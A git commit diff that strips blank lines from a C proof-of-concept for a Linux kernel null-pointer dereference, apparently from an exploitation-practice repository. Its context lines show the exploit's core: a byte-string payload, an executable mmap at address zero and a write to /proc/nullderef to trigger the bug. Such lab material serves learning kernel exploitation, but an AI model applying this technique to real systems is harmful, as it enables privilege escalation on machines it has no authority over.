63ac3af7a4e1d6322062b547146c76cea100b37a
sanloz <sanloz@localhost.localdomain>
2017-11-21 17:47:50 +0100

    cleaning garbage

--- 4.x/POCs/nulldereference/poc/poc.c
+++ 4.x/POCs/nulldereference/poc/poc.c
@@ -7,8 +7,6 @@
 
 char payload [] = "\xe9\x3c\x41\x41\x41";
 
-
-
 int main(){
 
   mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, \
@@ -17,8 +15,5 @@ int main(){
 
   int fd = open("/proc/nullderef", O_WRONLY);
   write(fd, "null dereference", 3);
-
-
-
 }
 
